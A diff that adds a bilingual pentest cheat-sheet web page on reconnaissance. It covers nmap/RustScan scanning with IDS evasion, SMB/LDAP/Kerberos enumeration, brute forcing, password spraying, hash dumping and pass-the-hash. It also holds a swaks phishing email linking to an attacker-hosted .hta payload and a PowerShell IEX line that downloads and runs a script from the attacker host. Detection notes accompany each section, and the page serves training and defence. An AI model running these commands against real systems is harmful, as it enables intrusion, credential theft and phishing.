@@ -1,0 +1,648 @@
+<!doctype html>
+<!-- ============================================================
+     新しいチートシートを作るときはこのファイルを複製して編集する。
+     置換箇所: <TITLE> / <SLUG> / <目次> / <本文>
+     ============================================================ -->
+<html lang="ja">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Reconnaissance — d0me</title>
+<meta name="description" content="Reconnaissance field notes — host discovery, port scanning, service enumeration, web enum, post-pivot internal recon.">
+<link rel="icon" href="../assets/img/favicon.svg" type="image/svg+xml">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Zen+Kaku+Gothic+New:wght@400;500;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../assets/css/sheet.css">
+</head>
+<body>
+
+<header class="topbar">
+  <div class="wrap">
+    <div class="brand"><span class="glyph">[<b data-handle>d0me</b>]</span><span class="tag">索引</span></div>
+    <button class="nav-toggle" aria-label="メニュー">≡</button>
+    <nav class="nav"><a href="../all.html">索引</a><a href="../index.html#certs">資格</a><a href="#" data-gh-url>github</a></nav>
+  </div>
+</header>
+
+<main>
+<section class="sheet-hero">
+  <div class="wrap">
+    <div class="crumb"><a href="/" data-blog>blog</a><span class="sep">/</span><a href="../all.html">索引</a><span class="sep">/</span>Reconnaissance</div>
+    <h1>Reconnaissance</h1>
+    <p class="lede">A phased flow for discovering hosts, ports, services, and internal networks — from initial handshake to post-pivot scanning.<span class="jp">ホスト発見からピボット後の内部偵察まで、段階的な情報収集の実行順序ノート。</span></p>
+  </div>
+</section>
+
+<div class="wrap">
+<div class="sheet-layout">
+  <aside class="toc">
+    <div class="toc-label">目次</div>
+    <ul>
+      <li><a href="#s01">01 Attacker Context</a></li>
+      <li><a href="#s02">02 Host Discovery</a></li>
+      <li><a href="#s03">03 Port Scanning</a></li>
+      <li><a href="#s04">04 Service Enumeration</a></li>
+      <li><a href="#s05">05 Web Enumeration</a></li>
+      <li><a href="#s06">06 Internal Recon</a></li>
+    </ul>
+  </aside>
+
+  <article class="doc">
+
+    <section id="s01" class="reveal">
+      <h2><span class="num">01</span>Attacker Context<span class="jp">攻撃元コンテキスト</span></h2>
+      <p>ターゲット到達前に環境変数を確定させる。以降のセクションのコマンドは <code>$TARGET</code> / <code>$RANGE</code> / <code>$LHOST</code> を前提。</p>
+
+      <h3>LHOST 動的取得 (VPN tun0)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code>ip a show tun0 | grep "inet " | awk '{print $2}' | cut -d/ -f1
+
+<span class="c"># 変数化</span>
+export LHOST=$(ip a show tun0 | grep "inet " | awk '{print $2}' | cut -d/ -f1)
+echo $LHOST</code></pre></div>
+
+      <h3>ターゲット環境変数化</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code>export TARGET=10.10.10.10
+export RANGE=10.10.10.0/24
+
+<span class="c"># 作業ディレクトリ (日付ベース)</span>
+mkdir -p ~/recon/$(date +%Y%m%d)/{scans,loot,exploits,notes}
+cd ~/recon/$(date +%Y%m%d)</code></pre></div>
+    </section>
+
+    <section id="s02" class="reveal">
+      <h2><span class="num">02</span>Host Discovery<span class="jp">ホスト発見</span></h2>
+
+      <h3>nmap ping sweep パターン</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># ARP スキャン (同一セグメント、最速・最正確)</span>
+sudo nmap -sn -PR $RANGE -oN scans/host_arp.txt
+
+<span class="c"># ICMP スキャン (ルータ越え)</span>
+sudo nmap -sn -PE $RANGE -oN scans/host_icmp.txt
+
+<span class="c"># TCP SYN ping (ICMP ブロック環境)</span>
+sudo nmap -sn -PS22,80,443,445,3389 $RANGE -oN scans/host_tcpping.txt
+
+<span class="c"># UDP ping (DNS ポート経由)</span>
+sudo nmap -sn -PU53 $RANGE -oN scans/host_udpping.txt
+
+<span class="c"># 包括スキャン (全方式組合せ + ソースポート偽装)</span>
+sudo nmap -sn -PE -PS21,22,23,25,80,113,31339 -PA80,113,443,10042 \
+  --source-port 53 $RANGE -oN scans/host_combo.txt</code></pre></div>
+
+      <h3>netdiscover (ARP 特化、パッシブ可)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># パッシブモード (受動的 ARP 観察)</span>
+sudo netdiscover -i tun0 -r $RANGE -p
+
+<span class="c"># アクティブモード</span>
+sudo netdiscover -i tun0 -r $RANGE</code></pre></div>
+
+      <h3>fping (高速、マルチホスト)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code>fping -a -g $RANGE 2>/dev/null</code></pre></div>
+
+      <h3>masscan (大規模ネットワーク)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># 10.0.0.0/8 級の広域スキャンに</span>
+sudo masscan -p80,443,445,3389 $RANGE --rate=1000 -oL scans/masscan_hosts.txt</code></pre></div>
+
+      <div class="defense"><span class="lbl">検知 / detection</span>
+        <ul>
+          <li>ARP スイープ: NIDS で短時間 (数秒) の連続 ARP request を閾値検知</li>
+          <li>ICMP エコー広域: firewall で ICMP echo を選択的ドロップ、ネットワーク境界で volumetric anomaly を SIEM 連携</li>
+          <li>TCP SYN ping: honeypot ホストを配置し、closed port への SYN 到達をカウント</li>
+          <li>ソースポート 53 の TCP SYN は正規トラフィックにはほぼ現れない → 高信頼シグナル</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s03" class="reveal">
+      <h2><span class="num">03</span>Port Scanning<span class="jp">ポートスキャン</span></h2>
+
+      <h3>RustScan (高速初動、推奨)</h3>
+      <p>全ポート高速検出 → 発見ポートを nmap に自動パイプ。参考: <a href="https://github.com/RustScan/RustScan" target="_blank" rel="noopener">RustScan/RustScan</a></p>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># TCP 全ポート高速 → nmap sV/sC/Pn へ自動パイプ</span>
+rustscan --accessible -a $TARGET -r 1-65535 -- -sT -sV -sC -Pn -oN scans/rustscan.txt
+
+<span class="c"># 複数ホスト並列</span>
+rustscan -a 10.10.10.10,10.10.10.20,10.10.10.30 -r 1-65535 -- -sC -sV
+
+<span class="c"># ulimit 警告回避</span>
+rustscan -a $TARGET -r 1-65535 --ulimit 5000 -- -sC -sV</code></pre></div>
+
+      <h3>nmap 3 段階パターン</h3>
+      <p><strong>第 1 段階: TCP 全ポート高速スキャン</strong></p>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># SYN スキャン (要 root、最高速)</span>
+sudo nmap -p- -sS --min-rate=5000 --max-retries=1 -Pn -n -T4 -oG scans/all_ports.gnmap $TARGET
+
+<span class="c"># Connect スキャン (root 不要)</span>
+nmap -p- -T4 -n -Pn --open $TARGET -oN scans/all_ports.txt
+
+<span class="c"># 検出ポートを変数化</span>
+export PORTS=$(grep '^Ports:' scans/all_ports.gnmap | tr ',' '\n' | grep open | awk -F'/' '{print $1}' | tr -d ' ' | paste -sd, -)
+echo $PORTS</code></pre></div>
+
+      <p><strong>第 2 段階: 詳細サービス検出</strong></p>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code>sudo nmap -p $PORTS -sV -sC -A -Pn -oN scans/detailed.txt -oX scans/detailed.xml $TARGET
+
+<span class="c"># vuln スクリプト実行 (長時間)</span>
+sudo nmap -p $PORTS -sV -sC --script vuln -Pn -oN scans/vuln_scan.txt $TARGET</code></pre></div>
+
+      <p><strong>第 3 段階: UDP スキャン (必須)</strong></p>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># TOP 100 UDP</span>
+sudo nmap -sU --top-ports 100 -Pn -n --min-rate=1000 -oN scans/udp_top100.txt $TARGET
+
+<span class="c"># 特定 UDP (SNMP / DNS / NetBIOS / IKE / SLP)</span>
+sudo nmap -sU -p 53,67,68,69,123,137,138,161,162,500,514,1900,4500,5353 -sV \
+  -oN scans/udp_specific.txt $TARGET</code></pre></div>
+
+      <h3>timing オプション</h3>
+      <table>
+        <thead><tr><th>タイミング</th><th>説明</th><th>用途</th></tr></thead>
+        <tbody>
+          <tr><td><code>-T0</code> (paranoid)</td><td>5 分間隔</td><td>IDS 極限回避</td></tr>
+          <tr><td><code>-T1</code> (sneaky)</td><td>15 秒間隔</td><td>IDS 回避</td></tr>
+          <tr><td><code>-T2</code> (polite)</td><td>0.4 秒間隔</td><td>帯域節約</td></tr>
+          <tr><td><code>-T3</code> (normal)</td><td>デフォルト</td><td>通常</td></tr>
+          <tr><td><code>-T4</code> (aggressive)</td><td>高速</td><td>実運用の既定値</td></tr>
+          <tr><td><code>-T5</code> (insane)</td><td>最速</td><td>結果精度低下</td></tr>
+        </tbody>
+      </table>
+
+      <h3>Firewall / IDS 回避</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># ソースポート偽装 (DNS 送信元装う)</span>
+sudo nmap -g53 -p- --max-retries=1 -Pn --disable-arp-ping $TARGET
+
+<span class="c"># パケット断片化</span>
+sudo nmap -f -p 80,443 $TARGET
+sudo nmap --mtu 24 -p 80,443 $TARGET
+
+<span class="c"># デコイ (ソース IP 偽装、囮 10 個)</span>
+sudo nmap -D RND:10 -p 80,443 $TARGET
+
+<span class="c"># 遅延・ランダム化</span>
+sudo nmap -T1 --scan-delay 1s --max-retries=1 -Pn $TARGET
+
+<span class="c"># ホスト発見無効化</span>
+sudo nmap -Pn --disable-arp-ping -p53 -sU -sC $TARGET</code></pre></div>
+
+      <div class="defense"><span class="lbl">検知 / detection</span>
+        <ul>
+          <li>SYN スキャン: TCP フラグに RST 応答が連続する場合、Zeek / Suricata で <code>scan.log</code> に記録</li>
+          <li>ソースポート 53 の TCP: DNS の TCP 応答以外で source port 53 が来るのは異常</li>
+          <li>MTU 24 の断片化パケット: firewall で全断片化パケットを block / alert</li>
+          <li>RND:10 デコイ: 同時期に同一パターンのスキャンが複数ソース IP から到達 → SIEM で相関</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s04" class="reveal">
+      <h2><span class="num">04</span>Service Enumeration<span class="jp">サービス列挙</span></h2>
+
+      <h3>04-1. SMB (139 / 445)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># nmap SMB スクリプト</span>
+sudo nmap -p 139,445 --script "smb-enum-*,smb-vuln-*,smb-os-discovery,smb2-security-mode,smb2-capabilities" \
+  -oN scans/smb.txt $TARGET
+
+<span class="c"># NetExec 全方位列挙 (匿名)</span>
+netexec smb $TARGET -u '' -p '' --shares --users --groups --loggedon-users \
+  --local-groups --sessions --rid-brute --pass-pol --local-auth
+
+<span class="c"># 認証後</span>
+netexec smb $TARGET -u user -p '<span class="v">&lt;PASSWORD&gt;</span>' --shares --users --groups
+netexec smb $RANGE -u user -p '<span class="v">&lt;PASSWORD&gt;</span>' --shares    <span class="c"># 横展開列挙</span>
+
+<span class="c"># ハッシュ列挙</span>
+netexec smb $RANGE -u user -H <span class="v">&lt;NTLM&gt;</span> --local-auth --sam
+netexec smb $TARGET -u user -p '<span class="v">&lt;PASSWORD&gt;</span>' --lsa
+netexec smb $TARGET -u user -p '<span class="v">&lt;PASSWORD&gt;</span>' --ntds    <span class="c"># DC のみ</span></code></pre></div>
+
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># enum4linux-ng (詳細列挙)</span>
+enum4linux-ng -A -C $TARGET
+
+<span class="c"># smbclient (匿名)</span>
+smbclient -L //$TARGET/ -N
+smbclient -L //$TARGET/ -U 'user%<span class="v">&lt;PASSWORD&gt;</span>'
+
+<span class="c"># 共有アクセス</span>
+smbclient //$TARGET/ShareName -U 'user%<span class="v">&lt;PASSWORD&gt;</span>'
+smbclient //$TARGET/SYSVOL -U 'contoso.local/user'
+smbclient //$TARGET/C$ -U Administrator --pw-nt-hash <span class="v">&lt;NTLM&gt;</span>
+
+<span class="c"># smbmap (共有権限一覧)</span>
+smbmap -H $TARGET -u user -p '<span class="v">&lt;PASSWORD&gt;</span>'
+smbmap -H $TARGET -R ShareName -u user -p '<span class="v">&lt;PASSWORD&gt;</span>'    <span class="c"># 再帰列挙</span>
+
+<span class="c"># rpcclient</span>
+rpcclient -U "" -N $TARGET       <span class="c"># 匿名</span>
+rpcclient -U 'contoso.local/user%<span class="v">&lt;PASSWORD&gt;</span>' $TARGET
+<span class="c"># &gt; enumdomusers / enumdomgroups / queryuser / querydominfo / getdompwinfo / lookupsids</span></code></pre></div>
+
+      <h3>04-2. LDAP (389 / 636 / 3268 / 3269)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code>sudo nmap -p 389,636,3268,3269 --script "ldap-search,ldap-rootdse,ldap-brute" \
+  -oN scans/ldap.txt $TARGET
+
+<span class="c"># 匿名バインド (namingcontext 取得)</span>
+ldapsearch -x -h $TARGET -s base namingcontexts
+
+<span class="c"># 認証後の base search</span>
+ldapsearch -x -H ldap://$TARGET -D 'user@contoso.local' -w '<span class="v">&lt;PASSWORD&gt;</span>' \
+  -b "DC=contoso,DC=local"
+
+<span class="c"># SPN 保有ユーザ (Kerberoast 候補) — 攻撃詳細は AD sheet 参照</span>
+ldapsearch -x -H ldap://$TARGET -D 'user@contoso.local' -w '<span class="v">&lt;PASSWORD&gt;</span>' \
+  -b "DC=contoso,DC=local" "(&amp;(objectClass=user)(servicePrincipalName=*))" \
+  sAMAccountName servicePrincipalName
+
+<span class="c"># LAPS 読取 (権限あり時)</span>
+ldapsearch -x -H ldap://$TARGET -D 'user@contoso.local' -w '<span class="v">&lt;PASSWORD&gt;</span>' \
+  -b "DC=contoso,DC=local" "(&amp;(objectClass=computer)(ms-MCS-AdmPwd=*))" \
+  ms-MCS-AdmPwd dnsHostName
+
+<span class="c"># NetExec LDAP (kerberoast/asrep 候補書出)</span>
+netexec ldap $TARGET -u user -p '<span class="v">&lt;PASSWORD&gt;</span>' \
+  --users --groups --asreproast asrep.txt --kerberoasting kerb.txt</code></pre></div>
+
+      <h3>04-3. SSH (22)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code>nmap -p 22 -sV --script "ssh2-enum-algos,ssh-hostkey,ssh-auth-methods" $TARGET
+
+<span class="c"># 認証方式確認</span>
+ssh -v user@$TARGET 2>&amp;1 | grep "authentications"
+
+<span class="c"># ブルートフォース</span>
+hydra -L users.txt -P passwords.txt ssh://$TARGET -t 4
+netexec ssh $TARGET -u users.txt -p passwords.txt --continue-on-success
+
+<span class="c"># 秘密鍵認証</span>
+netexec ssh $TARGET -u user -p '' --key-file id_rsa</code></pre></div>
+
+      <h3>04-4. FTP (21)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code>nmap -p 21 -sV --script "ftp-anon,ftp-bounce,ftp-syst,ftp-vuln-*" $TARGET
+
+<span class="c"># 匿名ログイン試行 (user: anonymous / pass: 空 or anonymous)</span>
+ftp $TARGET
+
+<span class="c"># 匿名でも読める場合の再帰ダウンロード</span>
+wget -r ftp://anonymous:anonymous@$TARGET
+
+<span class="c"># ブルートフォース</span>
+hydra -L users.txt -P passwords.txt ftp://$TARGET
+netexec ftp $TARGET -u users.txt -p passwords.txt --continue-on-success</code></pre></div>
+
+      <h3>04-5. SNMP (161 / udp)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code>sudo nmap -sU -p 161 --script "snmp-*" -oN scans/snmp.txt $TARGET
+
+<span class="c"># コミュニティ文字列ブルート</span>
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $TARGET
+
+<span class="c"># snmpwalk (代表 OID)</span>
+snmpwalk -v2c -c public $TARGET
+snmpwalk -v2c -c public $TARGET 1.3.6.1.2.1.25.4.2.1.2    <span class="c"># 実行中プロセス</span>
+snmpwalk -v2c -c public $TARGET 1.3.6.1.2.1.25.4.2.1.5    <span class="c"># プロセス引数 (パスワード漏洩)</span>
+snmpwalk -v2c -c public $TARGET 1.3.6.1.4.1.77.1.2.25     <span class="c"># Windows ユーザ</span>
+snmpwalk -v2c -c public $TARGET 1.3.6.1.2.1.25.6.3.1.2    <span class="c"># インストール済ソフト</span>
+
+<span class="c"># snmp-check (人間可読)</span>
+snmp-check $TARGET -c public</code></pre></div>
+
+      <h3>04-6. MSSQL (1433)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code>sudo nmap -p 1433 --script "ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config" $TARGET
+
+<span class="c"># impacket mssqlclient</span>
+mssqlclient.py user:'<span class="v">&lt;PASSWORD&gt;</span>'@$TARGET
+mssqlclient.py contoso.local/user:'<span class="v">&lt;PASSWORD&gt;</span>'@$TARGET -windows-auth
+mssqlclient.py -hashes :<span class="v">&lt;NTLM&gt;</span> -windows-auth 'contoso.local/user'@$TARGET
+
+<span class="c"># SQL 内: enum_db / enum_users / enum_links / enum_impersonate / enable_xp_cmdshell / xp_cmdshell whoami</span>
+
+<span class="c"># NetExec MSSQL</span>
+netexec mssql $TARGET -u user -p '<span class="v">&lt;PASSWORD&gt;</span>'
+netexec mssql $TARGET -u user -p '<span class="v">&lt;PASSWORD&gt;</span>' --local-auth -x 'whoami'
+netexec mssql $TARGET -u user -p '<span class="v">&lt;PASSWORD&gt;</span>' -q 'SELECT @@version'</code></pre></div>
+
+      <h3>04-7. MySQL (3306)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code>nmap -p 3306 -sV --script "mysql-info,mysql-empty-password,mysql-enum,mysql-users,mysql-databases,mysql-variables" $TARGET
+
+<span class="c"># 接続</span>
+mysql -h $TARGET -u root -p
+mysql -h $TARGET -u root --password=''
+
+<span class="c"># ブルートフォース</span>
+hydra -L users.txt -P passwords.txt mysql://$TARGET</code></pre></div>
+
+      <h3>04-8. WinRM (5985 / 5986)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code>nmap -p 5985,5986 --script "http-title" $TARGET
+
+<span class="c"># NetExec</span>
+netexec winrm $TARGET -u user -p '<span class="v">&lt;PASSWORD&gt;</span>'
+netexec winrm $TARGET -u user -H <span class="v">&lt;NTLM&gt;</span>
+netexec winrm $RANGE -u users.txt -p '<span class="v">&lt;PASSWORD&gt;</span>' --continue-on-success
+
+<span class="c"># Evil-WinRM (shell 取得)</span>
+evil-winrm -u user -p '<span class="v">&lt;PASSWORD&gt;</span>' -i $TARGET
+evil-winrm -u user -H <span class="v">&lt;NTLM&gt;</span> -i $TARGET</code></pre></div>
+
+      <h3>04-9. RDP (3389)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code>nmap -p 3389 --script "rdp-enum-encryption,rdp-ntlm-info,rdp-vuln-ms12-020" $TARGET
+
+<span class="c"># 認証前スクリーンショット</span>
+scrying -t rdp://$TARGET
+
+<span class="c"># 認証接続</span>
+xfreerdp /v:$TARGET /u:user /p:'<span class="v">&lt;PASSWORD&gt;</span>' +compression +clipboard \
+  /cert-ignore /dynamic-resolution
+
+<span class="c"># PtH (Restricted Admin 有効時のみ)</span>
+xfreerdp /v:$TARGET /u:Administrator /pth:<span class="v">&lt;NTLM&gt;</span> +compression /cert-ignore
+
+<span class="c"># ブルートフォース</span>
+hydra -L users.txt -P passwords.txt rdp://$TARGET -t 4
+netexec rdp $TARGET -u users.txt -p passwords.txt --continue-on-success</code></pre></div>
+
+      <h3>04-10. Kerberos (88)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code>nmap -p 88 --script "krb5-enum-users" \
+  --script-args "krb5-enum-users.realm='CONTOSO.LOCAL',userdb=users.txt" $TARGET
+
+<span class="c"># Kerbrute ユーザ列挙 (ロックアウトなし)</span>
+kerbrute userenum -d contoso.local --dc $TARGET users.txt
+
+<span class="c"># パスワードスプレー</span>
+kerbrute passwordspray -d contoso.local --dc $TARGET users.txt '<span class="v">&lt;PASSWORD&gt;</span>'
+
+<span class="c"># 単独ユーザへのブルート (ロックアウト注意)</span>
+kerbrute bruteuser -d contoso.local --dc $TARGET passwords.txt user</code></pre></div>
+
+      <h3>04-11. DNS (53)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code>nmap -p 53 --script "dns-zone-transfer,dns-nsid,dns-recursion" \
+  --script-args "dns-zone-transfer.domain=contoso.local" $TARGET
+
+<span class="c"># ゾーン転送試行</span>
+dig axfr @$TARGET contoso.local
+dig axfr @$TARGET -t any
+
+<span class="c"># サブドメイン列挙</span>
+dnsrecon -d contoso.local -n $TARGET -t axfr
+dnsenum contoso.local --dnsserver $TARGET
+
+<span class="c"># リバース DNS</span>
+dig -x $TARGET @$TARGET</code></pre></div>
+
+      <h3>04-12. NFS (2049)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code>nmap -p 2049 --script "nfs-*" $TARGET
+
+<span class="c"># 共有列挙</span>
+showmount -e $TARGET
+rpcinfo -p $TARGET
+
+<span class="c"># マウント</span>
+mkdir -p /mnt/nfs
+sudo mount -t nfs -o vers=3,nolock $TARGET:/share /mnt/nfs</code></pre></div>
+
+      <h3>04-13. SMTP (25 / 587)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code>nmap -p 25,465,587 \
+  --script "smtp-commands,smtp-enum-users,smtp-open-relay,smtp-ntlm-info,smtp-vuln-cve2010-4344" \
+  $TARGET
+
+<span class="c"># VRFY / EXPN / RCPT でユーザ列挙</span>
+smtp-user-enum -M VRFY -U users.txt -t $TARGET
+smtp-user-enum -M EXPN -U users.txt -t $TARGET
+smtp-user-enum -M RCPT -U users.txt -t $TARGET
+
+<span class="c"># フィッシング用配信 (swaks)</span>
+swaks --body 'click http://<span class="v">&lt;LHOST&gt;</span>/payload.hta' \
+  --header "Subject: IT Support" \
+  --add-header "MIME-Version: 1.0" \
+  --add-header "Content-Type: text/html" \
+  -t target@contoso.local \
+  -f helpdesk@contoso.local \
+  --server $TARGET</code></pre></div>
+
+      <h3>04-14. POP3 / IMAP (110 / 143 / 993 / 995)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code>nmap -p 110,143,993,995 \
+  --script "pop3-capabilities,pop3-ntlm-info,imap-capabilities,imap-ntlm-info" $TARGET
+
+<span class="c"># TLS 接続</span>
+openssl s_client -connect $TARGET:995
+openssl s_client -connect $TARGET:993
+
+<span class="c"># POP3: USER / PASS / LIST / RETR</span></code></pre></div>
+
+      <div class="defense"><span class="lbl">検知 / detection</span>
+        <ul>
+          <li>SMB 匿名列挙: <code>SMB1</code> 無効化、匿名接続に対する <code>RestrictAnonymous</code>、EID 5145 (共有アクセス)</li>
+          <li>LDAP: 単一ソースからの短時間大量クエリ、DC の Directory Service イベント (EID 1644)</li>
+          <li>SNMP: community="public" の使用停止、SNMPv3 強制、read-only view の徹底</li>
+          <li>Kerberos: EID 4768 (AS-REQ) の連続失敗、Kerberoast 候補 SPN の棚卸し、EID 4771</li>
+          <li>SMTP VRFY/EXPN: サーバ設定でコマンド disable、rate-limit</li>
+          <li>MSSQL: xp_cmdshell の無効化、認証失敗ログの SIEM 連携、EID 33205 (Audit)</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s05" class="reveal">
+      <h2><span class="num">05</span>Web Enumeration<span class="jp">Web 列挙</span></h2>
+      <p>webapp 側の攻撃 (auth / deserialization / ssti / upload) は <a href="web.html">web sheet</a> を参照。ここでは表面の列挙のみ扱う。</p>
+
+      <h3>初動スキャン</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># whatweb (技術スタック特定)</span>
+whatweb -a 3 http://$TARGET:80 -v
+
+<span class="c"># httpx (高速プローブ)</span>
+echo "http://$TARGET" | httpx -title -tech-detect -status-code -follow-redirects
+
+<span class="c"># nmap http スクリプト</span>
+sudo nmap -p 80,443,8080,8443 \
+  --script "http-enum,http-title,http-headers,http-methods,http-robots.txt,http-auth,http-webdav-scan,http-iis-short-name-brute,http-shellshock" \
+  $TARGET</code></pre></div>
+
+      <h3>nikto (自動脆弱性スキャン)</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code>nikto -h http://$TARGET
+nikto -h https://$TARGET -p 443 -ssl
+nikto -h http://$TARGET -Save scans/nikto.html -Format html</code></pre></div>
+
+      <h3>ディレクトリブルート</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># gobuster (高速)</span>
+gobuster dir -u http://$TARGET/ \
+  -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
+  -x php,asp,aspx,jsp,html,txt,bak,old,zip \
+  -b 404,401,403 -t 50 -o scans/gobuster.txt
+
+<span class="c"># ffuf (柔軟、パラメータ / VHOST 兼用)</span>
+ffuf -u http://$TARGET/FUZZ \
+  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -fc 404
+
+<span class="c"># feroxbuster (再帰特化)</span>
+feroxbuster -u http://$TARGET/ \
+  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
+  -x php,txt,html,bak -s 200,301,302,403 -t 50 -d 3 -o scans/ferox.txt</code></pre></div>
+
+      <h3>VHOST / サブドメイン列挙</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># ffuf VHOST (Host header fuzzing)</span>
+ffuf -u http://$TARGET/ -H "Host: FUZZ.contoso.local" \
+  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 1234
+
+<span class="c"># gobuster vhost / dns</span>
+gobuster vhost -u http://$TARGET \
+  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+gobuster dns -d contoso.local \
+  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 50
+
+<span class="c"># 外部ターゲット向け</span>
+subfinder -d contoso.local -all -recursive
+amass enum -d contoso.local</code></pre></div>
+
+      <h3>CMS 特化</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># WordPress</span>
+wpscan --url http://$TARGET
+wpscan --url http://$TARGET -e u,ap,at,vp,vt
+wpscan --url http://$TARGET -U users.txt -P /usr/share/wordlists/rockyou.txt
+
+<span class="c"># Joomla</span>
+joomscan -u http://$TARGET
+droopescan scan joomla -u http://$TARGET
+
+<span class="c"># Drupal</span>
+droopescan scan drupal -u http://$TARGET</code></pre></div>
+
+      <h3>パラメータ / WAF</h3>
+      <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div>
+<pre><code><span class="c"># Arjun (パラメータ列挙)</span>
+arjun -u http://$TARGET/api/endpoint -m GET
+arjun -u http://$TARGET/api/endpoint -m POST \
+  --wordlist /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
+
+<span class="c"># WAF 検出</span>
+wafw00f http://$TARGET -v
+
+<span class="c"># JS 分析</span>
+python3 linkfinder.py -i https://$TARGET -o results.html
+python3 SecretFinder.py -i https://$TARGET/app.js -o cli</code></pre></div>
+
+      <div class="defense"><span class="lbl">検知 / detection</span>
+        <ul>
+          <li>ディレクトリブルート: 404 応答の burst rate、User-Agent 分布の異常 (<code>gobuster</code>/<code>ffuf</code> のデフォルト UA)、WAF 側 rate limit</li>
+          <li>VHOST fuzzing: 同一 source IP からの異なる Host header 大量到達 → reverse proxy でカウント</li>
+          <li>WordPress: <code>xmlrpc.php</code> への POST 連続、<code>wp-login.php</code> への失敗ログイン</li>
+          <li>WAF: パターン更新の頻度確認、bypass 試行を alert 対象化</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="s06" class="reveal">
+      <h2><span class="num">06</span>Internal Recon (Post-Pivot)<span class="jp">ピボット後の内部偵察</span></h2>
+      <p>foothold 取得後、内部セグメントの偵察に移る。pivoting の setup 詳細 (chisel / ligolo-ng の proxy/agent 起動、SOCKS 経路構成) は <a href="lateral-movement.html">lateral-movement sheet</a> を参照。ここでは「トンネルが張られた状態」からのスキャン手段を扱う。</p>
+
+      <h3>Windows 侵害ホストからの内部スキャン</h3>
+      <p><strong>Invoke-Portscan (PowerSploit):</strong></p>
+      <div class="code"><div class="code-bar"><span class="code-lang">powershell</span><button class="copy">copy</button></div>
+<pre><code>IEX(New-Object Net.WebClient).DownloadString('http://<span class="v">&lt;LHOST&gt;</span>/Invoke-Portscan.ps1')
+
+Invoke-Portscan -Hosts 10.10.20.0/24 \
+  -Ports "21,22,23,53,80,88,135,139,389,443,445,1433,3306,3389,5985,5986,8080" \
